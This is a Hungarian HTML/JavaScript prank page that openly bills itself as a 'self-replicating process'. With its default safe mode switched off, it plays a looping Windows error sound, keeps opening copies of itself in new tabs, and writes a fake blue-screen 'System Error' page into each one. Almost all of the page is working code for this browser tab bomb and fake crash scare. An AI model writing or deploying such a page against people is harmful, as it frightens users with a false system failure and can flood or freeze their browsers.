<!DOCTYPE html>
<html lang="hu">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Rendszerfolyamat</title>

<style>
:root{
  --bg:#0b0f14;--panel:#121824;--accent:#3aa0ff;
  --text:#e7ecf3;--muted:#9aa4b2;--ok:#46d39a
}
*{box-sizing:border-box}
body{
  margin:0;
  font-family:system-ui,Segoe UI,Arial;
  background:radial-gradient(1200px 800px at 20% 10%, #12203a, var(--bg));
  color:var(--text);
}
.container{max-width:900px;margin:40px auto;padding:24px}
.card{
  background:linear-gradient(180deg,#141b2b,var(--panel));
  border:1px solid #1f2a44;border-radius:14px;
  box-shadow:0 30px 80px rgba(0,0,0,.45)
}
.header{padding:18px 20px;border-bottom:1px solid #1f2a44}
h1{margin:0;font-size:26px}
.section{padding:20px}
p{color:var(--muted);line-height:1.6}
label{display:flex;justify-content:space-between;margin:10px 0}
input{width:160px}
button{
  border:0;border-radius:12px;padding:14px 20px;
  font-weight:600;cursor:pointer
}
.primary{background:linear-gradient(135deg,#4aa8ff,#2c6cff);color:#fff}
.secondary{background:#121a2e;color:#c9d4e5;border:1px solid #2b3a66}
.footer{display:flex;justify-content:space-between;padding:16px 20px;border-top:1px solid #1f2a44}

.overlay{
  position:fixed;inset:0;display:none;
  align-items:center;justify-content:center;
  background:rgba(0,0,0,.75);z-index:50
}
.count{font-size:64px;font-weight:800;color:var(--accent)}

.toast{
  position:fixed;right:20px;bottom:20px;
  background:#0e1526;border:1px solid #2a3a66;
  border-radius:12px;padding:14px 16px
}
</style>
</head>

<body>

<div class="container">
  <div class="card">
    <div class="header">
      <h1>Rendszerfolyamat – klónozó mód</h1>
    </div>

    <div class="section">
      <p>
        Ez az oldal elindít egy önmagát szaporító folyamatot.
        SAFE MODE esetén csak szimuláció fut.
        Normál módban minden új lap újabb lapokat nyit, BSOD megjelenítéssel.
      </p>

      <label>
        SAFE MODE
        <input type="checkbox" id="safe" checked>
      </label>

      <label>
        Lapok ciklusonként
        <input type="number" id="tabs" value="1" min="1" max="10">
      </label>

      <label>
        Induló sebesség (ms)
        <input type="number" id="speed" value="1200">
      </label>

      <label>
        Hang
        <input type="checkbox" id="sound" checked>
      </label>
    </div>

    <div class="footer">
      <button class="secondary" onclick="info()">Info</button>
      <button class="primary" onclick="countdown()">Indítás</button>
    </div>
  </div>
</div>

<div class="overlay" id="cd">
  <div class="count" id="num">5</div>
</div>

<audio id="snd" loop>
  <source src="https://www.myinstants.com/media/sounds/windows-error.mp3">
</audio>

<script>
let running=false;

function countdown(){
  let n=5;
  cd.style.display="flex";
  num.textContent=n;
  const t=setInterval(()=>{
    n--; num.textContent=n;
    if(n===0){
      clearInterval(t);
      cd.style.display="none";
      start();
    }
  },1000);
}

function start(){
  running=true;

  if(sound.checked){
    snd.play().catch(()=>{});
  }

  if(!safe.checked){
    spawn();
  }

  setInterval(()=>{
    const t=document.createElement("div");
    t.className="toast";
    t.textContent="Rendszerfolyamat fut…";
    document.body.appendChild(t);
    setTimeout(()=>t.remove(),2500);
  },3000);
}

function spawn(){
  if(!running) return;

  for(let i=0;i<tabs.value;i++){
    const w=window.open(location.href,"_blank");
    if(w){
      w.onload=()=>{
        w.document.open();
        w.document.write(bsodHTML());
        w.document.close();

        // minden klón tovább szaporítja magát
        setTimeout(()=>{
          try{
            w.spawnFromClone();
          }catch(e){}
        },1500);
      };
    }
  }

  setTimeout(spawn, +speed.value);
}

/* === EZ FUT LE A KLÓNOLDALAKON IS === */
function spawnFromClone(){
  if(safe.checked) return;
  spawn();
}

function bsodHTML(){
return `
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>System Error</title>
<style>
html,body{
  margin:0;width:100%;height:100%;
  background:#0a5bd3;color:#eaf2ff;
  font-family:Segoe UI,system-ui
}
.wrap{padding:60px}
h1{font-size:96px;margin:0 0 20px}
p{font-size:20px;opacity:.9}
</style>
</head>
<body>
  <div class="wrap">
    <h1>:(</h1>
    <p>A rendszer problémába ütközött.</p>
    <p>Hibakód: BROWSER_OVERLOAD</p>
  </div>
</body>
</html>
`;
}

function info(){
  alert(
    "Kilépés:\n" +
    "• Böngésző bezárása\n" +
    "• SAFE MODE ajánlott bemutatóhoz\n\n" +
    "Normál módban az oldalak önmagukat szaporítják."
  );
}
</script>

</body>
</html>
